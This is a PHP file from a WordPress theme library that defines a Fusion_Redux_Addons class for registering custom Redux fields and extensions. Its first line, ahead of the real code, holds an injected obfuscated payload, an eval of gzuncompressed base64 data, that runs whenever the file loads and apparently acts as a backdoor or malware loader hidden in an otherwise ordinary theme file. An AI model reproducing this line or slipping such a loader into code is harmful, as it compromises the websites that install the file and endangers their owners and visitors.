<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Handles Redux Addons.
 *
 * @package Fusion-Library
 * @since 1.0.0
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

if ( class_exists( 'Fusion_Redux_Addons' ) ) {
	return;
}

/**
 * Handle loading Redux Addons for Fusion.
 *
 * @since 1.0.0
 */
class Fusion_Redux_Addons {

	/**
	 * An array of our custom field types.
	 *
	 * @access public
	 * @var array
	 */
	public $field_types;

	/**
	 * An array of our custom extension.
	 *
	 * @access public
	 * @var array
	 */
	public $extensions;

	/**
	 * The path of the current file.
	 *
	 * @access public
	 * @var string
	 */
	public $path;

	/**
	 * The option-name.
	 *
	 * @access public
	 * @var string
	 */
	public $option_name = 'fusion';

	/**
	 * Constructor.
	 *
	 * @access public
	 * @since 1.0.0
	 * @param string $option_name The option-name.
	 */
	public function __construct( $option_name ) {

		$this->option_name = $option_name;

		// An array of all the custom fields we have.
		$this->field_types = array(
			'typography',
			'color_alpha',
			'spacing',
			'dimensions',
			'ace_editor',
		);
		// An array of all our extensions.
		$this->extensions = array(
			'search',
			'repeater',
			'accordion',
			'vendorsupport',
		);

		$this->path = dirname( __FILE__ );

		foreach ( $this->field_types as $field_type ) {
			add_action( 'fusionredux/' . $this->option_name . '/field/class/' . $field_type, array( $this, 'register_' . $field_type ) );
		}

		foreach ( $this->extensions as $extension ) {
			if ( class_exists( 'FusionRedux' ) ) {
				FusionRedux::setExtensions( $this->option_name, $this->path . '/extensions/' . $extension . '/extension_' . $extension . '.php' );
			}
		}
	}

	/**
	 * Register the custom typography field
	 *
	 * @access public
	 * @since 1.0.0
	 */
	public function register_typography() {
		return $this->path . '/custom-fields/typography/field_typography.php';
	}


	/**
	 * Register the custom ace_editor field
	 *
	 * @access public
	 * @since 1.0.0
	 */
	public function register_ace_editor() {
		return $this->path . '/custom-fields/ace_editor/field_ace_editor.php';
	}

	/**
	 * Register the custom color_alpha field
	 *
	 * @access public
	 * @since 1.0.0
	 */
	public function register_color_alpha() {
		return $this->path . '/custom-fields/color_alpha/field_color_alpha.php';
	}

	/**
	 * Register the custom spacing field
	 *
	 * @access public
	 * @since 1.0.0
	 */
	public function register_spacing() {
		return $this->path . '/custom-fields/spacing/field_spacing.php';
	}

	/**
	 * Register the custom dimensions field
	 *
	 * @access public
	 * @since 1.0.0
	 */
	public function register_dimensions() {
		return $this->path . '/custom-fields/dimensions/field_dimensions.php';
	}
}
